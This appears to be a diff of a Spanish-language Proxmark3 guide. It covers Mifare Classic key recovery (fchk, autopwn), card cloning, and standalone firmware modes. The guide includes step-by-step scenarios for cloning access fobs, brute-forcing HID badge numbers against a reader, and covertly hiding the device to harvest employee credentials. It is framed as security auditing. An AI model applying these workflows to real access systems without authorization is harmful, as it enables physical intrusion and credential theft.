+- Carga diccionarios desde memoria flash (RDV4) para velocidad máxima
+- Detecta y almacena claves válidas automáticamente
+
+**Sintaxis y parámetros:**
 
 ```bash
-hf mf fchk --blk <número_bloque> --key <clave>
+# Verificación básica con diccionario
+hf mf fchk --1k -f mfc_default_keys.dic
+
+# Verificación usando memoria flash (RDV4)
+hf mf fchk --1k --mem
+
+# Verificar clave específica en bloque específico
+hf mf fchk --blk 0 -k FFFFFFFFFFFF
+
+# Verificación 4K con diccionario personalizado
+hf mf fchk --4k -f custom_keys.dic
+
+# Cargar claves encontradas al emulador automáticamente
+hf mf fchk --1k -f mfc_default_keys.dic --emu
+
+# Guardar claves encontradas a archivo binario
+hf mf fchk --1k -f mfc_default_keys.dic --dump
+```
+
+**Parámetros del comando fchk:**
+
+| Parámetro | Descripción |
+|-----------|-------------|
+| `-k, --key <hex>` | Clave específica de 12 caracteres hex para probar |
+| `--blk <dec>` | Número de bloque específico para probar |
+| `-a` | Probar solo clave A (si se encuentra, también verifica B) |
+| `-b` | Probar solo clave B |
+| `-*, --all` | Probar ambas claves A y B (por defecto) |
+| `--mini` | Mifare Classic Mini / S20 |
+| `--1k` | Mifare Classic 1k / S50 (por defecto) |
+| `--2k` | Mifare Classic/Plus 2k |
+| `--4k` | Mifare Classic 4k / S70 |
+| `--emu` | Cargar claves encontradas al emulador |
+| `--dump` | Guardar claves encontradas a archivo binario |
+| `-f, --file <fn>` | Archivo de diccionario con claves |
+| `--mem` | Usar diccionario desde memoria flash (RDV4) |
+
+**Flujo de trabajo optimizado con fchk:**
+
+```bash
+# 1. Cargar diccionario a memoria flash (solo una vez, RDV4)
+mem load -f mfc_default_keys.dic --mfc
+
+# 2. Verificación rápida desde flash
+hf mf fchk --1k --mem --emu --dump
+
+# 3. Si se encontraron claves, dump inmediato
+hf mf dump
+
+# 4. Si fchk no encontró todas las claves, usar autopwn
+hf mf autopwn
+```
+
+**Ejemplo de salida:**
+
+```
+[+] found keys:
+[+] -----+-----+--------------+---+--------------+----
+[+]  Sec | Blk | key A        |res| key B        |res
+[+] -----+-----+--------------+---+--------------+----
+[+]  000 | 003 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[+]  001 | 007 | A0A1A2A3A4A5 | 1 | B0B1B2B3B4B5 | 1
+[+]  002 | 011 | FFFFFFFFFFFF | 1 | FFFFFFFFFFFF | 1
+[=] Dumping keys to binary file hf-mf-<UID>-key.bin
 ```
 
 #### Automatización Completa con autopwn
 
-Como se ha mencionado, `hf mf autopwn` es el comando de automatización por excelencia para Mifare Classic.
+El comando `hf mf autopwn` es la **herramienta de automatización integral por excelencia** para auditoría de Mifare Classic. Ejecuta una secuencia inteligente y adaptativa de múltiples técnicas de ataque, optimizando automáticamente el orden según los resultados obtenidos.
 
-Su función es ejecutar de forma secuencial y automática un conjunto completo de ataques conocidos (ataque de diccionario, darkside, nested). Su objetivo es recuperar todas las claves de todos los sectores de la tarjeta de la manera más eficiente posible, generando al final los archivos de volcado (`.bin`) y de claves para su uso inmediato.
+**Secuencia de ataques de autopwn:**
+
+1. **Ataque de diccionario** (chk/fchk) → Busca claves por defecto conocidas
+2. **Ataque Nested** → Si hay ≥1 clave conocida, deriva las demás
+3. **Ataque Hardnested** → Si Nested falla, intenta variante avanzada
+4. **Ataque Darkside** → Si nada funciona, explota debilidad PRNG
+5. **Ataque StaticNested** → Para tarjetas con random débil
+6. **Dump automático** → Genera archivos .bin, .eml, .json
+
+**Sintaxis y parámetros:**
 
 ```bash
+# Autopwn básico (modo automático completo)
 hf mf autopwn
+
+# Autopwn con diccionario personalizado
+hf mf autopwn -f mfc_default_keys.dic
+
+# Autopwn para Mifare Classic 4K
+hf mf autopwn --4k
+
+# Autopwn con clave conocida como punto de partida
+hf mf autopwn -s 0 -a -k FFFFFFFFFFFF
+
+# Modo verbose (mostrar estadísticas)
+hf mf autopwn -v
+
+# Modo lento (para tarjetas no estándar)
+hf mf autopwn --slow
+
+# Modo legacy (usar chk en lugar de fchk)
+hf mf autopwn --legacy
+
+# Guardar con sufijo personalizado
+hf mf autopwn -o mycard
 ```
+
+**Parámetros del comando autopwn:**
+
+| Parámetro | Descripción |
+|-----------|-------------|
+| `-k, --key <hex>` | Clave conocida de 12 caracteres hex |
+| `-s, --sector <dec>` | Número de sector donde usar la clave conocida |
+| `-a` | La clave conocida es clave A (por defecto) |
+| `-b` | La clave conocida es clave B |
+| `-f, --file <fn>` | Archivo de diccionario personalizado |
+| `-o <fn>` | Sufijo para archivos de salida (dump y claves) |
+| `--slow` | Adquisición lenta (tarjetas no estándar) |
+| `--legacy` | Modo legacy (usar `hf mf chk` lento) |
+| `-v, --verbose` | Salida verbose con estadísticas |
+| `--mini` | Mifare Classic Mini / S20 |
+| `--1k` | Mifare Classic 1k / S50 (por defecto) |
+| `--2k` | Mifare Classic/Plus 2k |
+| `--4k` | Mifare Classic 4k / S70 |
+
+**Flujos de trabajo con autopwn:**
+
+**Escenario 1: Auditoría ciega (sin información previa)**
+
+```bash
+# Un solo comando obtiene todo
+hf mf autopwn
+
+# Archivos generados:
+# - hf-mf-<UID>-key.bin (claves)
+# - hf-mf-<UID>-dump.bin (volcado completo)
+# - hf-mf-<UID>-dump.eml (formato emulador)
+# - hf-mf-<UID>-dump.json (formato estructurado)
+```
+
+**Escenario 2: Auditoría con clave conocida**
+
+```bash
+# Si conoces una clave del sector 0
+hf mf autopwn -s 0 -a -k FFFFFFFFFFFF
+
+# autopwn usará nested/hardnested inmediatamente
+# saltando el ataque de diccionario completo
+```
+
+**Escenario 3: Tarjetas problemáticas**
+
+```bash
+# Algunas tarjetas chinas/clones requieren timing especial
+hf mf autopwn --slow
+
+# Si fchk causa problemas, usar modo legacy
+hf mf autopwn --legacy --slow
+```
+
+**Escenario 4: Organización de múltiples auditorías**
+
+```bash
+# Auditar tarjeta de acceso principal
+hf mf autopwn -o acceso_principal
+# Genera: hf-mf-<UID>-acceso_principal-dump.bin
+
+# Auditar tarjeta de empleado
+hf mf autopwn -o empleado_001
+# Genera: hf-mf-<UID>-empleado_001-dump.bin
+```
+
+**Comparación de velocidad:**
+
+| Método | Tiempo estimado (MFC 1K) | Casos de uso |
+|--------|-------------------------|-------------|
+| Manual (chk + nested) | 5-10 minutos | Aprendizaje, análisis detallado |
+| fchk + dump | 2-3 minutos | Claves conocidas en diccionario |
+| autopwn | 1-5 minutos | Auditorías rápidas, producción |
+| autopwn --slow | 5-15 minutos | Tarjetas problemáticas |
+
+**Tabla de decisión - ¿Qué comando usar?**
+
+| Situación | Comando recomendado |
+|-----------|--------------------|
+| Auditoría estándar sin información previa | `hf mf autopwn` |
+| Solo verificar si tiene claves por defecto | `hf mf fchk --1k --mem` |
+| Tengo una clave, necesito las demás | `hf mf nested -k <clave>` o `autopwn -k <clave>` |
+| Tarjeta con PRNG débil | `hf mf darkside` o `autopwn` (lo detecta) |
+| Tarjeta no estándar/china | `hf mf autopwn --slow --legacy` |
+| Necesito máxima velocidad (RDV4) | `hf mf fchk --mem` + `hf mf nested` |
+| Primera vez auditando Mifare | `hf mf autopwn` (más simple) |
+
+**Consejo profesional:**
+
+Para auditorías en campo donde el tiempo es crítico, el flujo óptimo es:
+
+```bash
+# 1. Identificación rápida
+hf search
+
+# 2. Ataque automatizado
+hf mf autopwn
+
+# 3. Análisis de datos (mientras se procesa)
+hf mf view -f hf-mf-<UID>-dump.bin
+
+# 4. Clonación inmediata si es necesario
+hf mf restore --1k -f hf-mf-<UID>-dump.bin
+```
+
+Este flujo te permite ir de "tarjeta desconocida" a "clon funcional" en menos de 5 minutos en la mayoría de casos.
 
 ### 5.2. Modo de Operación Autónomo (Standalone)
 
-La capacidad de operar en modo standalone transforma al Proxmark3 de una herramienta de laboratorio, dependiente de un PC, a un dispositivo de campo autónomo. Esta funcionalidad es ideal para escenarios de red teaming o auditorías físicas discretas, donde llevar un ordenador portátil no es práctico. Permite realizar operaciones de lectura, simulación o clonación sin estar conectado a un cliente.
+La capacidad de operar en modo standalone transforma al Proxmark3 de una herramienta de laboratorio, dependiente de un PC, a un dispositivo de campo autónomo. Esta funcionalidad es ideal para escenarios de red teaming, auditorías físicas discretas o evaluaciones de seguridad donde llevar un ordenador portátil no es práctico o no pasa desapercibido.
 
-A continuación se describe cómo funciona y se configura el modo standalone en un Proxmark3 Easy:
+El firmware RRG/Iceman incluye **múltiples modos standalone** precompilados para diferentes protocolos y escenarios de ataque. Cada modo standalone tiene su propia lógica de operación y secuencia de botones.
 
 #### Activación del Modo Standalone
 
-Para activar el modo, se mantiene presionado el botón físico del dispositivo durante aproximadamente 2 segundos.
+Para activar cualquier modo standalone:
 
-#### Secuencia de Operaciones
+1. **Mantener presionado el botón** del Proxmark3 durante **2-3 segundos**
+2. Observar el patrón de LEDs que indica qué modo standalone está activo
+3. Seguir la secuencia de botones específica del modo
 
-Una vez en modo autónomo, las pulsaciones cortas del botón activan diferentes funciones en una secuencia predefinida. El ciclo típico para etiquetas LF HID es el siguiente:
+**Para salir del modo standalone:**
+- **Mantener presionado el botón** durante **≥1 segundo** (HOLD)
+- O conectar el Proxmark3 al PC y enviar cualquier comando USB
 
-- **Pulsación #1**: El dispositivo busca una etiqueta LF HID para leerla y almacenarla en la memoria "verde".
-- **Pulsación #2**: El Proxmark3 simula la etiqueta HID leída de la memoria "verde".
-- **Pulsación #3**: El dispositivo escribe la etiqueta almacenada en memoria "verde" a una tarjeta virgen.
-- **Pulsación #4**: El dispositivo clona la etiqueta HID leída en una tarjeta virgen T5577.
-- **Pulsación #5**: Busca una segunda etiqueta LF HID para leerla y almacenarla en la memoria "azul".
-- El ciclo continúa con la simulación y clonación de la etiqueta en la memoria "azul".
+#### Verificar Modo Standalone Compilado
+
+Antes de usar standalone, verifica qué modo está compilado en tu firmware:
+
+```bash
+# Ver información del hardware y firmware
+hw status
+
+# Salida incluirá línea similar a:
+# Standalone mode.............. LF HID26 Read/Clone/Sim (SamyRun)
+```
+
+#### Modos Standalone Disponibles (LF)
+
+**1. LF_SAMYRUN - HID26 Read/Clone/Sim**
+
+El modo clásico de Samy Kamkar para tarjetas HID Prox de 26 bits.
+
+**Funcionalidad:**
+- Lee tarjetas HID Prox (formato H10301)
+- Simula tarjetas leídas
+- Clona a tarjetas T5577 vírgenes
+- Almacena hasta 2 tarjetas (A y B)
+
+**Secuencia de operación:**
+
+```
+┌─────────────────────────────────────┐
+│  ESTADO: Lectura (LED A o B ON)     │
+└─────────────────────────────────────┘
+         ↓
+   HOLD botón 280ms
+         ↓
+┌─────────────────────────────────────┐
+│  Leyendo tarjeta HID...             │
+│  LED seleccionado (A o B) encendido │
+└─────────────────────────────────────┘
+         ↓
+┌─────────────────────────────────────┐
+│  ESTADO: Simulación (LED C ON)      │
+└─────────────────────────────────────┘
+         ↓
+   HOLD botón
+         ↓
+┌─────────────────────────────────────┐
+│  Simulando tarjeta almacenada       │
+│  LEDs: A/B + C encendidos           │
+└─────────────────────────────────────┘
+         ↓
+   HOLD botón
+         ↓
+┌─────────────────────────────────────┐
+│  ESTADO: Clonación (LED D ON)       │
+└─────────────────────────────────────┘
+         ↓
+   Colocar T5577 virgen
+         ↓
+┌─────────────────────────────────────┐
+│  Clonando a T5577...                │
+│  LEDs: A/B + D encendidos           │
+└─────────────────────────────────────┘
+```
+
+**LEDs:**
+- LED A: Operando en banco/slot A
+- LED B: Operando en banco/slot B  
+- LED C: Modo simulación activo
+- LED D: Modo clonación activo
+
+**2. LF_EM4100RSWB - EM410x Read/Sim/Write/Brute**
+
+Modo avanzado para tarjetas EM410x con capacidad de bruteforce.
+
+**Funcionalidad:**
+- Lee llaveros EM410x
+- Simula EM410x
+- Clona a T5577
+- **Bruteforce**: Incrementa/decrementa ID automáticamente
+- Almacena hasta 4 slots
+
+**Modos de operación:**
+
+| Modo | Pulsación | Descripción |
+|------|-----------|-------------|
+| READ | Click corto → modo READ | Lee EM410x y guarda en slot actual |
+| SIM | Auto después de READ | Simula EM410x del slot actual |
+| WRITE | Click corto → modo WRITE | Clona a T5577 virgen |
+| BRUTE | Click corto → modo BRUTE | Incrementa ID y simula continuamente |
+
+**HOLD largo**: Cambia de slot (1→2→3→4→1)
+
+**Ejemplo de uso - Bruteforce de control de acceso:**
+
+```
+1. HOLD 2 seg → Entrar a standalone
+2. LED indica slot 1
+3. Click corto repetidas veces → Llegar a modo BRUTE
+4. Proxmark3 empezará a simular IDs incrementales
+5. Presentar al lector objetivo
+6. Cuando el lector abra, CLICK para guardar ID que funcionó
+```
+
+**3. LF_HIDBRUTE - HID Corporate 1000 Bruteforce**
+
+Modo especializado para bruteforce de tarjetas HID Corporate 1000 (35 bits).
+
+**Funcionalidad:**
+- Lee tarjeta HID original
+- Calcula checksums correctos (paridad)
+- Incrementa/decrementa Card Number
+- Mantiene Facility Code constante
+- Clona a T5577
+
+**Secuencia:**
+
+```
+HOLD → Leer tarjeta HID original
+HOLD de nuevo → Iniciar bruteforce
+  - Decrementa Card Number desde el leído
+  - Simula cada Card Number durante ~20 segundos
+  - Mantiene Facility Code original
+CLICK durante bruteforce → Detener
+HOLD durante lectura → Clonar a T5577
+```
+
+**Ejemplo práctico:**
+
+```
+Tarjeta leída: FC=101, CN=1337
+Bruteforce probará:
+  FC=101, CN=1336
+  FC=101, CN=1335
+  FC=101, CN=1334
+  ...
+  FC=101, CN=0
+```
+
+#### Modos Standalone Disponibles (HF)
+
+**4. HF_YOUNG - Mifare Classic Read/Sim**
+
+Modo para capturar y simular tarjetas Mifare Classic.
+
+**Funcionalidad:**
+- Lee UIDs de Mifare Classic
+- Almacena hasta 4 UIDs
+- Simula UIDs almacenados
+
+**Secuencia:**
+
+```
+Estado RECORD:
+  - LED del slot seleccionado encendido + LED D
+  - Acercar tarjeta Mifare → Captura UID
+  - LEDs parpadean al capturar
+  - Auto-cambia a estado EMULATE
+
+Estado EMULATE:
+  - LED del slot seleccionado encendido + LED B
+  - Proxmark3 simula UID almacenado
+  - CLICK → Cambiar de slot
+  - HOLD 1 seg → Volver a RECORD
+```
+
+**5. HF_ICECLASS - iClass Dump/Sim/Attack**
+
+Modo avanzado para tarjetas HID iClass.
+
+**Funcionalidad:**
+- Ataque LOCLASS (recuperación de claves)
+- Dump completo de tarjetas iClass
+- Simulación desde dumps
+- Guardado en flash (RDV4)
+
+**Modos:**
+
+| Pulsaciones | Modo | Descripción |
+|-------------|------|-------------|
+| 1 click | SIM | Simular iClass desde dump en flash |
+| 2 clicks | ATTACK | Ataque LOCLASS para recuperar claves |
+| 3 clicks | READER | Leer y dumpear tarjeta iClass |
+| HOLD | EXIT | Salir de standalone |
+
+**6. HF_MATTYRUN - Mifare Classic Autopwn Standalone**
+
+Modo autónomo que ejecuta autopwn sin PC.
+
+**Funcionalidad:**
+- Detecta tarjeta Mifare Classic
+- Ejecuta autopwn (diccionario + nested)
+- Carga dump en emulador
+- Simula tarjeta automáticamente
+
+**Operación:**
+
+```
+HOLD 2 seg → Entrar a standalone
+  ↓
+Acercar tarjeta Mifare
+  ↓
+LED C + D ON → Atacando...
+  ↓
+LED A + B + C ON → Cargando dump al emulador...
+  ↓
+Todos LEDs OFF → Simulación activa
+  ↓
+Presentar Proxmark3 al lector objetivo
+  ↓
+CLICK corto → Volver a detección
+HOLD 1 seg → Salir
+```
+
+#### Modos Standalone de Recopilación de Datos
+
+**7. LF_ICEHID - HID/EM/AWID Collector**
+
+Recopila credenciales LF y las guarda en flash (RDV4).
+
+**Funcionalidad:**
+- Escaneo continuo de tarjetas HID, EM410x, AWID
+- Almacena todas las credenciales únicas en archivo de log
+- Perfecto para auditorías de largo plazo
+
+**Operación:**
+
+```
+HOLD 2 seg → Iniciar recopilación
+LED A ON → Escaneando...
+LED B parpadea → Credencial detectada y guardada
+LED C parpadea → Escribiendo a flash
+
+HOLD 280ms → Detener y salir
+
+Para recuperar datos:
+Conectar a PC:
+pm3 --> mem spiffs dump -s lf_hidcollect.log -d lf_hidcollect.log
+```
+
+**8. HF_14ASNIFF - ISO14443A Traffic Logger**
+
+Captura tráfico entre lector y tarjeta ISO14443A.
+
+**Funcionalidad:**
+- Sniffing pasivo de comunicaciones HF
+- Captura autenticaciones, comandos, datos
+- Guarda trace a flash (RDV4)
+
+**Operación:**
+
+```
+HOLD 2 seg → Iniciar sniffing
+LED A ON → Sniffing activo
+LED B/C parpadean → Tráfico detectado
+
+CLICK corto → Detener sniffing
+LED D ON → Guardando trace a flash
+
+Recuperar datos:
+pm3 --> mem spiffs dump -s hf_14asniff.trace -d hf_14asniff.trace
+pm3 --> trace load -f hf_14asniff.trace
+pm3 --> trace list -t mf
+```
+
+#### Compilar Modos Standalone Personalizados
+
+Para cambiar el modo standalone compilado:
+
+```bash
+# 1. Editar archivo de configuración
+cd ~/proxmark3
+nano Makefile.platform
+
+# 2. Encontrar línea STANDALONE
+# Cambiar a modo deseado:
+STANDALONE=LF_SAMYRUN        # Para HID26
+# o
+STANDALONE=LF_HIDBRUTE       # Para bruteforce HID
+# o  
+STANDALONE=HF_YOUNG          # Para Mifare UID
+# o
+STANDALONE=HF_MATTYRUN       # Para Mifare autopwn
+
+# 3. Recompilar firmware
+make clean && make -j
+
+# 4. Flashear
+pm3-flash-all
+
+# 5. Verificar
+hw status
+```
+
+**Modos standalone disponibles:**
+
+| Nombre | Protocolo | Funcionalidad principal |
+|--------|-----------|------------------------|
+| LF_SAMYRUN | HID Prox | Read/Clone/Sim HID26 |
+| LF_EM4100RSWB | EM410x | Read/Sim/Write/Bruteforce |
+| LF_EM4100RWC | EM410x | Read/Write/Clone simple |
+| LF_HIDBRUTE | HID | Corporate 1000 bruteforce |
+| LF_PROXBRUTE | HID | ProxII bruteforce |
+| LF_ICEHID | Multi-LF | Recopilador HID/EM/AWID |
+| HF_YOUNG | Mifare | UID Read/Sim |
+| HF_MATTYRUN | Mifare | Autopwn standalone |
+| HF_ICECLASS | iClass | Dump/Sim/Attack |
+| HF_14ASNIFF | ISO14443A | Traffic sniffer |
+| HF_AVEFUL | Ultralight | MFU Read/Sim |
+| HF_CRAFTBYTE | ISO14443A | UID scanner/emulator |
+
+#### Casos de Uso Prácticos de Standalone
+
+**Escenario 1: Auditoría de parking corporativo**
+
+```
+Objetivo: Clonar llavero de acceso vehicular
+
+Modo: LF_SAMYRUN
+
+1. HOLD 2 seg → Activar standalone
+2. Pedir prestado llavero a empleado
+3. HOLD 280ms → Iniciar lectura (LED A ON)
+4. Acercar llavero → Captura automática
+5. HOLD → Cambiar a modo SIM (LED C ON)
+6. Probar en barrera → Confirmar funciona
+7. HOLD → Cambiar a CLONE (LED D ON)
+8. Colocar T5577 virgen → Clonación automática
+9. Devolver llavero original
+10. Usar clon en evaluación posterior
+```
+
+**Escenario 2: Bruteforce de badge de empleado**
+
+```
+Objetivo: Encontrar badges válidos variando Card Number
+
+Modo: LF_HIDBRUTE
+
+1. Obtener badge de empleado conocido (prestado)
+2. HOLD 2 seg → Standalone
+3. HOLD 280ms → Leer badge (FC=100, CN=5000)
+4. Devolver badge original
+5. HOLD de nuevo → Iniciar bruteforce
+6. Proxmark3 prueba: 4999, 4998, 4997...
+7. Presentar a lector durante bruteforce
+8. Cuando lector abra, CLICK para detener
+9. Ese Card Number es válido
+```
+
+**Escenario 3: Recopilación masiva de credenciales**
+
+```
+Objetivo: Capturar todas las tarjetas usadas en un lector
+
+Modo: LF_ICEHID
+
+1. Esconder Proxmark3 cerca del lector (con batería)
+2. HOLD 2 seg → Iniciar recopilación
+3. Dejar operando 8 horas (turno laboral)
+4. Recuperar dispositivo
+5. Conectar a PC
+6. mem spiffs dump -s lf_hidcollect.log -d badges.txt
+7. Analizar badges capturados
+```
+
+**Ventajas del Modo Standalone:**
+
+- **Sigilo**: Sin necesidad de laptop visible
+- **Movilidad**: Solo necesitas el Proxmark3 y batería
+- **Velocidad**: Operaciones inmediatas sin bootear PC
+- **Autonomía**: Funciona con batería durante horas (RDV4)
+- **Simplicidad**: Sin cables, sin comandos, solo botones
+
+**Limitaciones:**
+
+- Solo un modo standalone activo (requiere recompilación para cambiar)
+- Sin feedback visual detallado (solo LEDs)
+- Capacidad de almacenamiento limitada (2-4 slots típicamente)
+- No permite análisis en tiempo real de datos
+- Bruteforce puede ser lento sin feedback de éxito del lector
 
 ---
 
